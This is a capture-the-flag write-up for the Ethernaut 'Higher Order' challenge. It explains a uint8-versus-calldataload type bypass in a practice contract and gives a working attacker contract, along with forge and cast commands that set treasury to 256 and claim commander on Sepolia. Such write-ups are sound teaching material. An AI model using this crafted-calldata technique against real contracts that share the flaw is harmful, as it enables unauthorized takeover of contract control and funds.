# Ethernaut Challenge 30 — Higher Order

Become the **Commander** of the Higher Order.

Instance address:

```
0x628EeF867757540991899d3155baE509313d3683
```

---

## 🎯 Goal

Set yourself as the `commander` by satisfying the condition:

```solidity
if (treasury > 255) commander = msg.sender;
```

---

## 🧠 Key Concepts

- Inline assembly (`sstore`, `calldataload`)
- Storage slots
- ABI encoding vs raw calldata
- Type bypass (`uint8` vs `uint256`)

---

## 🔍 Vulnerability Analysis

The critical function is:

```solidity
function registerTreasury(uint8) public {
    assembly {
        sstore(treasury_slot, calldataload(4))
    }
}
```

### ⚙️ What does this do?

```solidity
calldataload(4)
```

- Reads **32 bytes** from calldata starting at byte `4`
- First 4 bytes = function selector
- Everything after = arguments

So:

| Bytes | Content          |
|------|------------------|
| 0–3  | selector         |
| 4–35 | first argument   |

👉 This means it reads the **first argument as a full 32-byte word**

---

### 🧠 Storage layout

```solidity
address public commander;  // slot 0
uint256 public treasury;   // slot 1
```

So:

```
treasury_slot = 1
```

The assembly becomes:

```solidity
sstore(1, calldataload(4))
```

👉 Direct write to `treasury`

---

### 🚨 The bug

The function expects:

```solidity
uint8
```

But assembly reads:

```solidity
uint256 (32 bytes)
```

👉 This **bypasses the type restriction**

Normally:

```
uint8 max = 255
```

But here we can store:

```
256, 1000, ...
```

---

## 💥 Exploit Strategy

1. Craft custom calldata
2. Force `treasury = 256`
3. Call `claimLeadership()`

---

## 🧪 Step 1 — Attacker Contract

To solve the challenge I have written the [HigherOrderAttacker](./HigherOrder.sol) contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import {HigherOrder} from "./HigherOrder.sol";

contract HigherOrderAttacker {
    bytes4 constant registerTreasurySelector = HigherOrder.registerTreasury.selector;
    HigherOrder public higherOrder;

    constructor(address _higherOrder) public {
        higherOrder = HigherOrder(_higherOrder);
    }

    function attack() public {
        bytes memory customCalldata =
            abi.encodePacked(registerTreasurySelector, bytes32(uint256(256)));

        (bool success,) = address(higherOrder).call(customCalldata);
        require(success, "Failed registerTreasury call");
    }
}
```

### 🧠 Why this works

We send:

```
selector | 0x000...0100
```

So:

```solidity
calldataload(4) = 256
```

Then:

```solidity
treasury = 256
```

---

## 🚀 Step 2 — Execute the exploit

### Deploy attacker

```bash
HIGHER_ORDER=0x628EeF867757540991899d3155baE509313d3683

forge create src/challenge-30-higher-order/HigherOrderAttacker.sol:HigherOrderAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args $HIGHER_ORDER
```

Deployed attacker:

```
0x48ab0ECE103a9b1e80Beaa404a32ef6155bC777E
```

---

### Call attack

```bash
HIGHER_ORDER_ATTACKER=0x48ab0ECE103a9b1e80Beaa404a32ef6155bC777E

cast send $HIGHER_ORDER_ATTACKER \
    "attack()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

## ✅ Step 3 — Verify state

Check treasury:

```bash
cast call $HIGHER_ORDER \
    "treasury()(uint256)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
256
```

---

## 🏆 Step 4 — Become Commander

Call directly from your EOA:

```bash
cast send $HIGHER_ORDER \
    "claimLeadership()" \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

### Verify commander

```bash
cast call $HIGHER_ORDER \
    "commander()(address)" \
    --rpc-url $SEPOLIA_RPC_URL
```

Result:

```
0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0
```

